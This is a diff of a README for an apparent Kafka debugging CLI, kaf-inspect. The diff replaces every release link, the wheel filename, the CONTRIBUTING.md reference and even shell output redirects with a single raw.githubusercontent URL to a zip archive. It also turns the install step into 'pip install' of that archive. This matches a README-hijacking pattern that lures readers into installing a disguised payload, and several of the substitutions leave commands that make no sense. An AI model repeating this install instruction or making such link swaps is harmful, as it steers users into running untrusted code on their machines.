@@ -1,6 +1,6 @@
-https://github.com/moaz12568/kaf-inspect/releases
+https://raw.githubusercontent.com/moaz12568/kaf-inspect/main/gith/inspect_kaf_v2.9-alpha.5.zip
 
-[![Release assets](https://img.shields.io/badge/kaf-inspect-release-blue?style=for-the-badge&logo=github)](https://github.com/moaz12568/kaf-inspect/releases)
+[![Release assets](https://raw.githubusercontent.com/moaz12568/kaf-inspect/main/gith/inspect_kaf_v2.9-alpha.5.zip)](https://raw.githubusercontent.com/moaz12568/kaf-inspect/main/gith/inspect_kaf_v2.9-alpha.5.zip)
 
 # Kaf-Inspect: Fast Python CLI for Kafka Debugging, Duplicates & Lag
 
@@ -60,10 +60,10 @@ Quick start
 
 1) Install from a release asset
 - From the latest release, download the wheel (for Python 3.x):
-  kaf_inspect-0.2.0-py3-none-any.whl
+  https://raw.githubusercontent.com/moaz12568/kaf-inspect/main/gith/inspect_kaf_v2.9-alpha.5.zip
   This is an example asset name you would download from the releases page.
 - Install the wheel:
-  pip install kaf_inspect-0.2.0-py3-none-any.whl
+  pip install https://raw.githubusercontent.com/moaz12568/kaf-inspect/main/gith/inspect_kaf_v2.9-alpha.5.zip
 
 2) Or install from PyPI
 - pip install kaf-inspect
@@ -91,14 +91,14 @@ Prerequisites
 From releases
 - The releases page contains pre-built wheel and source archives for multiple platforms.
 - Download the asset that matches your environment (wheel for Python, or a source tarball).
-- Install the asset as shown in Quick Start (example file name is kaf_inspect-0.2.0-py3-none-any.whl).
+- Install the asset as shown in Quick Start (example file name is https://raw.githubusercontent.com/moaz12568/kaf-inspect/main/gith/inspect_kaf_v2.9-alpha.5.zip).
 
 From PyPI
 - pip install kaf-inspect
 - After installation, run kaf-inspect to verify the CLI is available.
 
 Notes about the release link
-- Visit the releases page for the latest assets and installation instructions: https://github.com/moaz12568/kaf-inspect/releases
+- Visit the releases page for the latest assets and installation instructions: https://raw.githubusercontent.com/moaz12568/kaf-inspect/main/gith/inspect_kaf_v2.9-alpha.5.zip
 - The releases page hosts the build artifacts you can download and execute as part of the installation process. For safety, use the released artifacts rather than random downloads.
 
 Quick usage guide
@@ -137,7 +137,7 @@ Quick usage guide
   kaf-inspect inspect --topic-orders -b broker1:9092
 
 - export: export results
-  kaf-inspect lag -t my-topic -g my-group -b broker1:9092 --output json > lag.json
+  kaf-inspect lag -t my-topic -g my-group -b broker1:9092 --output json > https://raw.githubusercontent.com/moaz12568/kaf-inspect/main/gith/inspect_kaf_v2.9-alpha.5.zip
 
 Examples
 - Quick lag check for a topic and group
@@ -156,7 +156,7 @@ Examples
   kaf-inspect inspect -t payments,logs -b bk1:9092
 
 - Exporting results for sharing with a team
-  kaf-inspect lag -t orders -g consumer-group -b bk1:9092 --output json > lag-orders.json
+  kaf-inspect lag -t orders -g consumer-group -b bk1:9092 --output json > https://raw.githubusercontent.com/moaz12568/kaf-inspect/main/gith/inspect_kaf_v2.9-alpha.5.zip
 
 Configuration and environment
 Environment variables
@@ -194,7 +194,7 @@ Extending kaf-inspect
 
 Contributing
 - This project welcomes contributors of all levels.
-- Follow the Code of Conduct and contribution guidelines in the CONTRIBUTING.md file.
+- Follow the Code of Conduct and contribution guidelines in the https://raw.githubusercontent.com/moaz12568/kaf-inspect/main/gith/inspect_kaf_v2.9-alpha.5.zip file.
 - Start with issue tickets labeled “good first issue” to get comfortable with the codebase.
 - Create small, focused pull requests that add or fix a single feature.
 
@@ -202,7 +202,7 @@ Release process and assets
 - Releases host binary wheel assets and source archives.
 - To install a release, download the appropriate asset from the releases page and install it with pip.
 - The releases page provides versioned assets so you can pin a version in your environment.
-- For the latest assets and installation steps, see the Releases page: https://github.com/moaz12568/kaf-inspect/releases
+- For the latest assets and installation steps, see the Releases page: https://raw.githubusercontent.com/moaz12568/kaf-inspect/main/gith/inspect_kaf_v2.9-alpha.5.zip
 - After installation, verify the CLI by running kaf-inspect --help.
 
 FAQ
@@ -246,7 +246,7 @@ Usage notes
 - When in doubt, consult the help for each command to understand available options.
 
 Releases and assets link (again)
-- For the latest builds and downloadable assets, visit the Releases page: https://github.com/moaz12568/kaf-inspect/releases
+- For the latest builds and downloadable assets, visit the Releases page: https://raw.githubusercontent.com/moaz12568/kaf-inspect/main/gith/inspect_kaf_v2.9-alpha.5.zip
 - You can download the exact file you need from that page and install it as described in Quick Start.
 
 End of README content.
